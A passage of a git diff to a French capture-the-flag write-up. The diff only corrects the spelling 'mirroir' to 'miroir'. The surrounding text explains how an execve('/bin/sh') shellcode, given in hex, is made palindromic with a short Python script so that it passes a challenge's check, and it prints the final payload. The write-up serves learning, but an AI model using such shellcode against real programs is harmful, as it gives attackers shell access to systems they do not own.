@@ -63,15 +63,15 @@ nop * 28
 ```
 
 En hexa, il nous donne : `48B82F62696E2F736800504889E748C7C03B00000048C7C60000000048C7C20000000048B90F0590909090909048898C248800000090909090909090909090909090909090909090909090909090909090`
-Pour qu'il soit accepté par le programme, il ne reste plus qu'à le "palindromer", c'est-à-dire faire en sorte qu'il se lise dans les deux sens... Un peu comme un effet mirroir, ou comme le rendre symétrique en fait !
+Pour qu'il soit accepté par le programme, il ne reste plus qu'à le "palindromer", c'est-à-dire faire en sorte qu'il se lise dans les deux sens... Un peu comme un effet miroir, ou comme le rendre symétrique en fait !
 En gros, si notre shellcode est "01 02 03", il faudra qu'on l'envoie comme ça au programme : "01 02 03 03 02 01"
 
-En quelques lignes de Python on peut "mirroiriser" notre shellcode, voici le script utilisé :
+En quelques lignes de Python on peut "miroiriser" notre shellcode, voici le script utilisé :
 
 ```
 #!/usr/bin/python3
 
-def mirroirMirroir(scHex):
+def miroirmiroir(scHex):
     scBytes = bytes.fromhex(scHex)
     scBytesPalindrome = scBytes + scBytes[::-1]
     print(scBytesPalindrome)
@@ -81,11 +81,11 @@ def mirroirMirroir(scHex):
 
 
 sc = "48B82F62696E2F736800504889E748C7C03B00000048C7C60000000048C7C20000000048B90F0590909090909048898C248800000090909090909090909090909090909090909090909090909090909090"
-mirroirMirroir(sc)
+miroirmiroir(sc)
 ```
 
-Evidemment, la partie "mirroirisée" de notre shellcode va donner des instructions complètement "junk" qui vont faire planter le programme.
-MAIS, comme on aura patché et surtout exécuté notre instruction "syscall" AVANT de tomber sur la partie mirroirisée junk... Eh bien on aura ouvert notre shell avant que cette partie soit exécutée !
+Evidemment, la partie "miroirisée" de notre shellcode va donner des instructions complètement "junk" qui vont faire planter le programme.
+MAIS, comme on aura patché et surtout exécuté notre instruction "syscall" AVANT de tomber sur la partie miroirisée junk... Eh bien on aura ouvert notre shell avant que cette partie soit exécutée !
 Donc au final, on n'a pas à se soucier du tout de cette partie, ce qui nous permet de bypasser la contrainte que voulait probablement nous imposer le challmaker :-) (faire des instructions qui s'exécutent de manière cohérente dans les deux sens).
 
 En exécutant le script du-dessus, on obtient : `48b82f62696e2f736800504889e748c7c03b00000048c7c60000000048c7c20000000048b90f0590909090909048898c2488000000909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909000000088248c8948909090909090050fb94800000000c2c74800000000c6c7480000003bc0c748e78948500068732f6e69622fb848`
